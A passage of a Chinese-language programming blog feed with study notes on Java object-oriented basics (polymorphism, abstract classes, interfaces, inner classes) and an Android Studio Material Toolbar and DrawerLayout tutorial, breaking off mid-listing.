title="多态"></a>多态</h2><ul><li><p>动态编译：类型可扩展</p></li><li><p>即同一方法可以根据发送对象的不同而采用多种不同的行为方式。</p></li><li><p>一个对象的实际类型是确定的，但可以指向对象的引用的类型有很多</p></li><li><p>多态存在的条件</p><ul><li><p>有继承关系</p></li><li><p>子类重写父类方法</p></li><li><p>父类引用指向子类对象</p></li></ul></li><li><p>注意:多态是方法的多态，属性没有多态性。</p></li><li><p>instance of 类型转换 引用类型，判断一个对象是什么类型</p></li></ul><p>一个对象的实例类型是确定的</p><p>可以指向的引用类型就不确定，父类的引用指向子类</p><p>能执行哪些方法，主要看对象左边的类型和右边关系不大</p><p>多态注意事项：</p><ol><li>多态是方法的的多态，属性没有多态</li><li>父类和子类，有联系  类型转换异常！ ClassCastException</li><li>存在条件：继承关系，方法需要重写，父类引用指向子类对象  father f1=new Son();<ol><li>static 方法属于类，它不属于实例</li><li>final 常量</li><li>private方法</li></ol></li></ol><h2 id="instanceof"><a href="#instanceof" class="headerlink" title="instanceof"></a>instanceof</h2><p>判断是否存在父子关系</p><p>如</p><figure class="highlight java"><table><tr><td class="gutter hljs"><div class="hljs code-wrapper"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></div></td><td class="code"><div class="hljs code-wrapper"><pre><code class="hljs java">Object object=<span class="hljs-keyword">new</span> Student();<br>object <span class="hljs-keyword">instanceof</span> Student;<span class="hljs-comment">//true</span><br>object <span class="hljs-keyword">instanceof</span> Person;<span class="hljs-comment">//true</span><br>object <span class="hljs-keyword">instanceof</span> Object;<span class="hljs-comment">//true</span><br>objecr <span class="hljs-keyword">instanceof</span> String;<span class="hljs-comment">//false</span><br></code></pre></div></td></tr></table></figure><p>类型转化</p><p>高转低：直接转换即可</p><p>低转告：强制转换（可能会丢失一些自己的方法）</p><figure class="highlight java"><table><tr><td class="gutter hljs"><div class="hljs code-wrapper"><pre><span class="line">1</span><br></pre></div></td><td class="code"><div class="hljs code-wrapper"><pre><code class="hljs java">((Student) obj).methos();<span class="hljs-comment">//强制转换之后可以调用Student的方法</span><br></code></pre></div></td></tr></table></figure><p>总结：</p><ol><li>父类引用指向子类的对象</li><li>把子类转换为父类，向上转型</li><li>把父类转换为子类，向下转型；强制转换</li><li>方便方法的调用，减少重复代码</li></ol><p>抽象：封装、继承、多态</p><h2 id="static"><a href="#static" class="headerlink" title="static"></a>static</h2><p>Student.java</p><figure class="highlight java"><table><tr><td class="gutter hljs"><div class="hljs code-wrapper"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br></pre></div></td><td class="code"><div class="hljs code-wrapper"><pre><code class="hljs java"><br><span class="hljs-comment">//静态导入包</span><br><span class="hljs-keyword">import</span> <span class="hljs-keyword">static</span> java.lang.Math.random;<br><span class="hljs-keyword">public</span> <span class="hljs-class"><span class="hljs-keyword">class</span> <span class="hljs-title">Student</span> </span>&#123;<br>   <br>    &#123;<br>        <span class="hljs-comment">//匿名代码块</span><br>        System.out.println(<span class="hljs-string">&quot;匿名代码块&quot;</span>);<br>    &#125;<br>    <span class="hljs-keyword">static</span> &#123;<br>        <span class="hljs-comment">//静态代码块</span><br>        System.out.println(<span class="hljs-string">&quot;静态代码块&quot;</span>);<br>    &#125;<br>    <span class="hljs-keyword">private</span> <span class="hljs-keyword">static</span> <span class="hljs-keyword">int</span> age;<span class="hljs-comment">//静态的变量</span><br><br>    <span class="hljs-function"><span class="hljs-keyword">public</span> <span class="hljs-title">Student</span><span class="hljs-params">()</span></span>&#123;<br>        System.out.println(<span class="hljs-string">&quot;构造方法&quot;</span>);<br>    &#125;<br>    <span class="hljs-function"><span class="hljs-keyword">public</span> <span class="hljs-keyword">static</span> <span class="hljs-keyword">void</span> <span class="hljs-title">main</span><span class="hljs-params">(String[] args)</span></span>&#123;<br>        Student student=<span class="hljs-keyword">new</span> Student();<br>        <span class="hljs-comment">//直接使用</span><br>        System.out.println(random());<br>    &#125;<br>&#125;<br><span class="hljs-comment">/*输出结果</span><br><span class="hljs-comment">首先没有新建Student就只有静态 静态只创建一次</span><br><span class="hljs-comment">创建后</span><br><span class="hljs-comment">静态代码块</span><br><span class="hljs-comment">匿名代码块</span><br><span class="hljs-comment">构造方法</span><br><span class="hljs-comment">*/</span><br><br></code></pre></div></td></tr></table></figure><p>通过final修饰的不能被继承和赋值</p><h2 id="抽象类"><a href="#抽象类" class="headerlink" title="抽象类"></a>抽象类</h2><p>Action.java</p><figure class="highlight java"><table><tr><td class="gutter hljs"><div class="hljs code-wrapper"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></div></td><td class="code"><div class="hljs code-wrapper"><pre><code class="hljs java"><span class="hljs-keyword">package</span> ll.javalearn.class_study;<br><br><span class="hljs-comment">//抽象类 extends 单继承 接口多继承</span><br><span class="hljs-keyword">public</span> <span class="hljs-keyword">abstract</span> <span class="hljs-class"><span class="hljs-keyword">class</span> <span class="hljs-title">Action</span> </span>&#123;<br>    <span class="hljs-comment">//抽象方法只有方法名字，没有方法的实现 子类继承后必须被重写</span><br>    <span class="hljs-function"><span class="hljs-keyword">public</span> <span class="hljs-keyword">abstract</span> <span class="hljs-keyword">void</span> <span class="hljs-title">dosomething</span><span class="hljs-params">()</span></span>;<br>&#125;<br><br></code></pre></div></td></tr></table></figure><p>总结：</p><ol><li>不能new这个抽象类，只能靠子类去实现它；约束</li><li>抽象类中可以写普通方法</li><li>抽象方法必须在抽象类中</li></ol><p>抽象的抽象：约束</p><p>抽象方法存在构造器</p><h2 id="接口"><a href="#接口" class="headerlink" title="接口"></a>接口</h2><ul><li>普通类:只有具体实现I</li><li>抽象类:具体实现和规范(抽象方法)都有!</li><li>接口:只有规范! 自己无法写方法，约束和实现分离</li><li>接口就是规范，定义的是一组规则，体现了现实世界中“如果你是…则必须能…”的思想，如果你是天使，则必须能飞。如果你是汽车，则必须能跑。如果你好人，则必须干掉坏人;如果你是坏人，则必须欺负好人。接口的本质是契约，就像我们人间的法律一样。制定好后大家都遵守。</li><li>OO的精髓，是对对象的抽象，最能体现这一点的就是接口。为什么我们讨论设计模式都只针对具备了抽象能力的语言（比如c++、java、c#等)，就是因为设计模式所研究的，实际上就是如何合理的去抽象。</li></ul><p>声明类的关键字是class ，声明接口的关键字是interface</p><p>UserServer.java</p><figure class="highlight java"><table><tr><td class="gutter hljs"><div class="hljs code-wrapper"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br></pre></div></td><td class="code"><div class="hljs code-wrapper"><pre><code class="hljs java"><span class="hljs-keyword">package</span> ll.javalearn.class_study;<br><br><span class="hljs-comment">//抽象的思维 java</span><br><br><span class="hljs-keyword">public</span> <span class="hljs-class"><span class="hljs-keyword">interface</span> <span class="hljs-title">UserService</span> </span>&#123;<br>    <span class="hljs-comment">//接口中的所有定义都是抽象的pbluic abstract</span><br>    <span class="hljs-comment">//常量</span><br>    <span class="hljs-keyword">int</span> age=<span class="hljs-number">99</span>;<br>    <span class="hljs-function"><span class="hljs-keyword">void</span> <span class="hljs-title">add</span><span class="hljs-params">(<span class="hljs-keyword">int</span> n)</span></span>;<br><br>&#125;<br><br></code></pre></div></td></tr></table></figure><p>UserServerImpl.java</p><figure class="highlight java"><table><tr><td class="gutter hljs"><div class="hljs code-wrapper"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></div></td><td class="code"><div class="hljs code-wrapper"><pre><code class="hljs java"><span class="hljs-keyword">package</span> ll.javalearn.class_study;<br><span class="hljs-comment">//类实现接口 可接多个接口</span><br><span class="hljs-keyword">public</span> <span class="hljs-class"><span class="hljs-keyword">class</span> <span class="hljs-title">UserServiceImpl</span> <span class="hljs-keyword">implements</span> <span class="hljs-title">UserService</span></span>&#123;<br><br>    <span class="hljs-meta">@Override</span><br>    <span class="hljs-function"><span class="hljs-keyword">public</span> <span class="hljs-keyword">void</span> <span class="hljs-title">add</span><span class="hljs-params">(<span class="hljs-keyword">int</span> n)</span> </span>&#123;<br><br>    &#125;<br>&#125;<br><br></code></pre></div></td></tr></table></figure><p>作用：</p><ol><li>进行约束</li><li>定义方法，让具体的类去首先</li><li>定义的方法开头均是public abstract</li><li>定义的变量均为public static final 修饰</li><li>接口不能被实例化，接口中没有构造方法</li><li>implements 可以实现多接口</li><li>调用后必须需要重写接口中的方法</li></ol><h2 id="内部类"><a href="#内部类" class="headerlink" title="内部类"></a>内部类</h2><p>Nei.java</p><figure class="highlight java"><table><tr><td class="gutter hljs"><div class="hljs code-wrapper"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br></pre></div></td><td class="code"><div class="hljs code-wrapper"><pre><code class="hljs java"><span class="hljs-keyword">package</span> ll.javalearn.class_study;<br><br><span class="hljs-keyword">public</span> <span class="hljs-class"><span class="hljs-keyword">class</span> <span class="hljs-title">Nei</span> </span>&#123;<br><br>    <span class="hljs-keyword">private</span> <span class="hljs-keyword">int</span> id=<span class="hljs-number">10</span>;<br>    <span class="hljs-function"><span class="hljs-keyword">public</span> <span class="hljs-keyword">void</span> <span class="hljs-title">out</span><span class="hljs-params">()</span></span>&#123;<br>        System.out.println(<span class="hljs-string">&quot;这是外部类的方法&quot;</span>);<br>    &#125;<br><br>    <span class="hljs-keyword">public</span> <span class="hljs-class"><span class="hljs-keyword">class</span> <span class="hljs-title">Inner</span></span>&#123;<br>        <span class="hljs-comment">//局部内部类</span><br>        <span class="hljs-function"><span class="hljs-keyword">public</span> <span class="hljs-keyword">void</span> <span class="hljs-title">in</span><span class="hljs-params">()</span></span>&#123;<br>            <span class="hljs-class"><span class="hljs-keyword">class</span> <span class="hljs-title">In</span></span>&#123;<br>                <br>            &#125;<br>            System.out.println(<span class="hljs-string">&quot;这是内部类的方法&quot;</span>);<br>        &#125;<br>        <span class="hljs-comment">//可以获得外部类的私有部分</span><br>        <span class="hljs-function"><span class="hljs-keyword">public</span> <span class="hljs-keyword">void</span> <span class="hljs-title">getId</span><span class="hljs-params">()</span></span>&#123;<br>            System.out.println(id);<br>        &#125;<br>    &#125;<br>&#125;<br><br></code></pre></div></td></tr></table></figure><p>Main.java</p><figure class="highlight java"><table><tr><td class="gutter hljs"><div class="hljs code-wrapper"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br></pre></div></td><td class="code"><div class="hljs code-wrapper"><pre><code class="hljs java"><span class="hljs-keyword">package</span> ll.javalearn.class_study;<br><br><span class="hljs-keyword">public</span> <span class="hljs-class"><span class="hljs-keyword">class</span> <span class="hljs-title">Main</span> </span>&#123;<br>    <span class="hljs-function"><span class="hljs-keyword">public</span> <span class="hljs-keyword">static</span> <span class="hljs-keyword">void</span> <span class="hljs-title">main</span><span class="hljs-params">(String[] args)</span> </span>&#123;<br>        Nei nei=<span class="hljs-keyword">new</span> Nei();<br>        Nei.Inner inner=nei.<span class="hljs-function">new <span class="hljs-title">Inner</span><span class="hljs-params">()</span></span>;<br>        inner.getId();<br>        <span class="hljs-comment">//没有名字初始化类，不用将实例保存到变量中</span><br>        <span class="hljs-keyword">new</span> A().eat();<br>    &#125;<br>&#125;<br><span class="hljs-comment">//一个java类中只有一个public类但是可以有多个class类</span><br><br><span class="hljs-class"><span class="hljs-keyword">class</span> <span class="hljs-title">A</span></span>&#123;<br>    <span class="hljs-function"><span class="hljs-keyword">public</span> <span class="hljs-keyword">void</span> <span class="hljs-title">eat</span><span class="hljs-params">()</span></span>&#123;<br>        System.out.ptintln(<span class="hljs-string">&quot;1&quot;</span>);<br>    &#125;<br>&#125;<br></code></pre></div></td></tr></table></figure>]]></content>
    
    
    <categories>
      
      <category>Java JavaBase</category>
      
    </categories>
    
    
    <tags>
      
      <tag>基础</tag>
      
      <tag>Java</tag>
      
    </tags>
    
  </entry>
  
  
  
  <entry>
    <title>Android Studio Material</title>
    <link href="/2021/04/02/AndroidStudio/Android%20Studio%20Material/"/>
    <url>/2021/04/02/AndroidStudio/Android%20Studio%20Material/</url>
    
    <content type="html"><![CDATA[<h1 id="Android-Studio-Material"><a href="#Android-Studio-Material" class="headerlink" title="Android Studio Material"></a>Android Studio Material</h1><h2 id="Android-Studio-Material-Toolbar"><a href="#Android-Studio-Material-Toolbar" class="headerlink" title="Android Studio Material_Toolbar"></a>Android Studio Material_Toolbar</h2><p>themes.xml</p><figure class="highlight xml"><table><tr><td class="gutter hljs"><div class="hljs code-wrapper"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></div></td><td class="code"><div class="hljs code-wrapper"><pre><code class="hljs xml"><span class="hljs-comment">&lt;!-- 更改原设置为如下 --&gt;</span><br><span class="hljs-tag">&lt;<span class="hljs-name">style</span> <span class="hljs-attr">name</span>=<span class="hljs-string">&quot;Theme.MaterialTest&quot;</span> <span class="hljs-attr">parent</span>=<span class="hljs-string">&quot;Theme.MaterialComponents.DayNight.NoActionBar&quot;</span>&gt;</span><br></code></pre></div></td></tr></table></figure><p>activity_main.xml</p><figure class="highlight xml"><table><tr><td class="gutter hljs"><div class="hljs code-wrapper"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br></pre></div></td><td class="code"><div class="hljs code-wrapper"><pre><code class="hljs xml"><span class="hljs-meta">&lt;?xml version=&quot;1.0&quot; encoding=&quot;utf-8&quot;?&gt;</span><br><span class="hljs-tag">&lt;<span class="hljs-name">FrameLayout</span> <span class="hljs-attr">xmlns:android</span>=<span class="hljs-string">&quot;http://schemas.android.com/apk/res/android&quot;</span></span><br><span class="hljs-tag">    <span class="hljs-attr">xmlns:app</span>=<span class="hljs-string">&quot;http://schemas.android.com/apk/res-auto&quot;</span></span><br><span class="hljs-tag">    <span class="hljs-attr">xmlns:tools</span>=<span class="hljs-string">&quot;http://schemas.android.com/tools&quot;</span></span><br><span class="hljs-tag">    <span class="hljs-attr">android:layout_width</span>=<span class="hljs-string">&quot;match_parent&quot;</span></span><br><span class="hljs-tag">    <span class="hljs-attr">android:layout_height</span>=<span class="hljs-string">&quot;match_parent&quot;</span></span><br><span class="hljs-tag">    <span class="hljs-attr">tools:context</span>=<span class="hljs-string">&quot;.MainActivity&quot;</span>&gt;</span><br><br>    <span class="hljs-tag">&lt;<span class="hljs-name">androidx.appcompat.widget.Toolbar</span></span><br><span class="hljs-tag">        <span class="hljs-attr">android:id</span>=<span class="hljs-string">&quot;@+id/toolbar&quot;</span></span><br><span class="hljs-tag">        <span class="hljs-attr">android:background</span>=<span class="hljs-string">&quot;@color/purple_700&quot;</span></span><br><span class="hljs-tag">        <span class="hljs-attr">android:theme</span>=<span class="hljs-string">&quot;@style/ThemeOverlay.AppCompat.Dark.ActionBar&quot;</span></span><br><span class="hljs-tag">        <span class="hljs-attr">app:popupTheme</span>=<span class="hljs-string">&quot;@style/ThemeOverlay.AppCompat.Light&quot;</span></span><br><span class="hljs-tag">        <span class="hljs-attr">android:layout_width</span>=<span class="hljs-string">&quot;match_parent&quot;</span></span><br><span class="hljs-tag">        <span class="hljs-attr">android:layout_height</span>=<span class="hljs-string">&quot;?attr/actionBarSize&quot;</span>/&gt;</span><br><br><span class="hljs-tag">&lt;/<span class="hljs-name">FrameLayout</span>&gt;</span><br></code></pre></div></td></tr></table></figure><p>toolbar.xml</p><figure class="highlight xml"><table><tr><td class="gutter hljs"><div class="hljs code-wrapper"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br></pre></div></td><td class="code"><div class="hljs code-wrapper"><pre><code class="hljs xml"><span class="hljs-meta">&lt;?xml version=&quot;1.0&quot; encoding=&quot;utf-8&quot;?&gt;</span><br><span class="hljs-tag">&lt;<span class="hljs-name">menu</span> <span class="hljs-attr">xmlns:android</span>=<span class="hljs-string">&quot;http://schemas.android.com/apk/res/android&quot;</span></span><br><span class="hljs-tag">    <span class="hljs-attr">xmlns:app</span>=<span class="hljs-string">&quot;http://schemas.android.com/apk/res-auto&quot;</span>&gt;</span><br><br>    <span class="hljs-tag">&lt;<span class="hljs-name">item</span></span><br><span class="hljs-tag">        <span class="hljs-attr">android:id</span>=<span class="hljs-string">&quot;@+id/backup&quot;</span></span><br><span class="hljs-tag">        <span class="hljs-attr">android:icon</span>=<span class="hljs-string">&quot;@drawable/tmp_1&quot;</span></span><br><span class="hljs-tag">        <span class="hljs-attr">android:title</span>=<span class="hljs-string">&quot;Backup&quot;</span></span><br><span class="hljs-tag"></span><br><span class="hljs-tag">        <span class="hljs-attr">app:showAsAction</span>=<span class="hljs-string">&quot;always&quot;</span>/&gt;</span><br>    <span class="hljs-tag">&lt;<span class="hljs-name">item</span></span><br><span class="hljs-tag">        <span class="hljs-attr">android:id</span>=<span class="hljs-string">&quot;@+id/delete&quot;</span></span><br><span class="hljs-tag">        <span class="hljs-attr">android:icon</span>=<span class="hljs-string">&quot;@drawable/bs&quot;</span></span><br><span class="hljs-tag">        <span class="hljs-attr">android:title</span>=<span class="hljs-string">&quot;Delete&quot;</span></span><br><span class="hljs-tag">        <span class="hljs-attr">app:showAsAction</span>=<span class="hljs-string">&quot;ifRoom&quot;</span>/&gt;</span><br>    <span class="hljs-tag">&lt;<span class="hljs-name">item</span></span><br><span class="hljs-tag">        <span class="hljs-attr">android:id</span>=<span class="hljs-string">&quot;@+id/setting&quot;</span></span><br><span class="hljs-tag">        <span class="hljs-attr">android:icon</span>=<span class="hljs-string">&quot;@drawable/home&quot;</span></span><br><span class="hljs-tag">        <span class="hljs-attr">android:title</span>=<span class="hljs-string">&quot;setting&quot;</span></span><br><span class="hljs-tag">        <span class="hljs-attr">app:showAsAction</span>=<span class="hljs-string">&quot;never&quot;</span>/&gt;</span><br><br><span class="hljs-tag">&lt;/<span class="hljs-name">menu</span>&gt;</span><br></code></pre></div></td></tr></table></figure><p>MainActivity.java</p><figure class="highlight java"><table><tr><td class="gutter hljs"><div class="hljs code-wrapper"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br></pre></div></td><td class="code"><div class="hljs code-wrapper"><pre><code class="hljs java"><span class="hljs-keyword">package</span> com.example.materialtest;<br><br><span class="hljs-keyword">import</span> androidx.appcompat.widget.Toolbar;<br><span class="hljs-keyword">import</span> androidx.appcompat.app.AppCompatActivity;<br><br><span class="hljs-keyword">import</span> android.os.Build;<br><span class="hljs-keyword">import</span> android.os.Bundle;<br><span class="hljs-keyword">import</span> android.view.Menu;<br><span class="hljs-keyword">import</span> android.view.MenuItem;<br><span class="hljs-keyword">import</span> android.widget.Toast;<br><br><span class="hljs-keyword">public</span> <span class="hljs-class"><span class="hljs-keyword">class</span> <span class="hljs-title">MainActivity</span> <span class="hljs-keyword">extends</span> <span class="hljs-title">AppCompatActivity</span> </span>&#123;<br><br>    <span class="hljs-meta">@Override</span><br>    <span class="hljs-function"><span class="hljs-keyword">protected</span> <span class="hljs-keyword">void</span> <span class="hljs-title">onCreate</span><span class="hljs-params">(Bundle savedInstanceState)</span> </span>&#123;<br>        <span class="hljs-keyword">super</span>.onCreate(savedInstanceState);<br>        setContentView(R.layout.activity_main);<br><br>        Toolbar toolbar=(Toolbar)findViewById(R.id.toolbar);<br>        setSupportActionBar(toolbar);<br>    &#125;<br>    <span class="hljs-comment">//判断点击menu？</span><br>    <span class="hljs-function"><span class="hljs-keyword">public</span> <span class="hljs-keyword">boolean</span> <span class="hljs-title">onCreateOptionsMenu</span><span class="hljs-params">(Menu menu)</span></span>&#123;<br>        getMenuInflater().inflate(R.menu.toolbar,menu);<br>        <span class="hljs-keyword">return</span> <span class="hljs-keyword">true</span>;<br>    &#125;<br>    <span class="hljs-comment">//判断具体点击</span><br>    <span class="hljs-function"><span class="hljs-keyword">public</span> <span class="hljs-keyword">boolean</span> <span class="hljs-title">onOptionsItemSelected</span><span class="hljs-params">(MenuItem item)</span></span>&#123;<br>        <span class="hljs-keyword">switch</span> (item.getItemId())&#123;<br>            <span class="hljs-keyword">case</span> R.id.backup:<br>                Toast.makeText(<span class="hljs-keyword">this</span>,<span class="hljs-string">&quot;你点击了返回&quot;</span>,Toast.LENGTH_SHORT).show();<br>                <span class="hljs-keyword">break</span>;<br>            <span class="hljs-keyword">case</span> R.id.delete:<br>                Toast.makeText(<span class="hljs-keyword">this</span>,<span class="hljs-string">&quot;你点击了删除&quot;</span>,Toast.LENGTH_SHORT).show();<br>                <span class="hljs-keyword">break</span>;<br>            <span class="hljs-keyword">case</span> R.id.setting:<br>                Toast.makeText(<span class="hljs-keyword">this</span>,<span class="hljs-string">&quot;你点击了设置&quot;</span>,Toast.LENGTH_SHORT).show();<br>                <span class="hljs-keyword">break</span>;<br>            <span class="hljs-keyword">default</span>:<br>        &#125;<br>        <span class="hljs-keyword">return</span>  <span class="hljs-keyword">true</span>;<br>    &#125;<br>&#125;<br></code></pre></div></td></tr></table></figure><h2 id="Android-Studio-Material-DrawerLayout"><a href="#Android-Studio-Material-DrawerLayout" class="headerlink" title="Android Studio Material_DrawerLayout"></a>Android Studio Material_DrawerLayout</h2><p>相关代码</p><p>MainActivity.java</p><figure class="highlight java"><table><tr><td class="gutter hljs"><div class="hljs code-wrapper"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br></pre></div></td><td class="code"><div class="hljs code-wrapper"><pre><code class="hljs java"><span class="hljs-keyword">package</span> com.example.materialtest;<br><br><span class="hljs-keyword">import</span> androidx.appcompat.app.ActionBar;<br><span class="hljs-keyword">import</span> androidx.appcompat.widget.Toolbar;<br><span class="hljs-keyword">import</span> androidx.appcompat.app.AppCompatActivity;<br><span class="hljs-keyword">import</span> androidx.core.view.GravityCompat;<br><span class="hljs-keyword">import</span> androidx.drawerlayout.widget.DrawerLayout;<br><br><span class="hljs-keyword">import</span> android.os.Build;<br><span class="hljs-keyword">import</span> android.os.Bundle;<br><span class="hljs-keyword">import</span> android.view.Menu;<br><span class="hljs-keyword">import</span> android.view.MenuItem;<br><span class="hljs-keyword">import</span> android.widget.Toast;<br><br><span class="hljs-keyword">public</span> <span class="hljs-class"><span class="hljs-keyword">class</span> <span class="hljs-title">MainActivity</span> <span class="hljs-keyword">extends</span> <span class="hljs-title">AppCompatActivity</span> </span>&#123;<br><br>    <span class="hljs-comment">//新增定义滑动菜单</span><br>    <span class="hljs-keyword">private</span> DrawerLayout mDrawerLayout;<br>    <span class="hljs-meta">@Override</span><br>    <span class="hljs-function"><span class="hljs-keyword">protected</span> <span class="hljs-keyword">void</span> <span class="hljs-title">onCreate</span><span class="hljs-params">(Bundle savedInstanceState)</span> </span>&#123;<br>        <span class="hljs-keyword">super</span>.onCreate(savedInstanceState);<br>        setContentView(R.layout.activity_main);<br><br>        Toolbar toolbar=(Toolbar)findViewById(R.id.toolbar);<br>        setSupportActionBar(toolbar);<br>        <span class="hljs-comment">//获取菜单id</span><br>        mDrawerLayout=(DrawerLayout)findViewById(R.id.drawer_layout);<br>        ActionBar actionBar=getSupportActionBar();<br>        <span class="hljs-keyword">if</span>(actionBar!=<span class="hljs-keyword">null</span>)&#123;<br>            actionBar.setDisplayHomeAsUpEnabled(<span class="hljs-keyword">true</span>);<br>            actionBar.setHomeAsUpIndicator(R.drawable.logo);<br>        &#125;<br>    &#125;<br>    <span class="hljs-function"><span class="hljs-keyword">public</span> <span class="hljs-keyword">boolean</span> <span class="hljs-title">onCreateOptionsMenu</span><span class="hljs-params">(Menu menu)</span></span>&#123;<br>        getMenuInflater().inflate(R.menu.toolbar,menu);<br>        <span class="hljs-keyword">return</span> <span class="hljs-keyword">true</span>;<br>    &#125;<br>    <span class="hljs-function"><span class="hljs-keyword">public</span> <span class="hljs-keyword">boolean</span> <span class="hljs-title">onOptionsItemSelected</span><span class="hljs-params">(MenuItem item)</span></span>&#123;<br>        <span class="hljs-keyword">switch</span> (item.getItemId())&#123;<br>                <span class="hljs-comment">//监听是否点击了home</span><br>            <span class="hljs-keyword">case</span> android.R.id.home:<br>                mDrawerLayout.openDrawer(GravityCompat.START);<br>                <span class="hljs-keyword">break</span>;<br>            <span class="hljs-keyword">case</span> R.id.backup:<br>                Toast.makeText(<span class="hljs-keyword">this</span>,<span class="hljs-string">&quot;你点击了返回&quot;</span>,Toast.LENGTH_SHORT).show();<br>                <span class="hljs-keyword">break</span>;<br>            <span class="hljs-keyword">case</span> R.id.delete:<br>                Toast.makeText(<span class="hljs-keyword">this</span>,<span class="hljs-string">&quot;你点击了删除&quot;</span>,Toast.LENGTH_SHORT).show();<br>                <span class="hljs-keyword">break</span>;<br>            <span class="hljs-keyword">case</span> R.id.setting:<br>                Toast.makeText(<span class="hljs-keyword">this</span>,<span class="hljs-string">&quot;你点击了设置&quot;</span>,Toast.LENGTH_SHORT).show();<br>                <span class="hljs-keyword">break</span>;<br>            <span class="hljs-keyword">default</span>:<br>        &#125;<br>        <span class="hljs-keyword">return</span>  <span class="hljs-keyword">true</span>;<br>    &#125;<br>&#125;<br></code></pre></div></td></tr></table></figure><p>activity_main.xml</p><figure class="highlight xml"><table><tr><td class="gutter hljs"><div class="hljs code-wrapper"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span 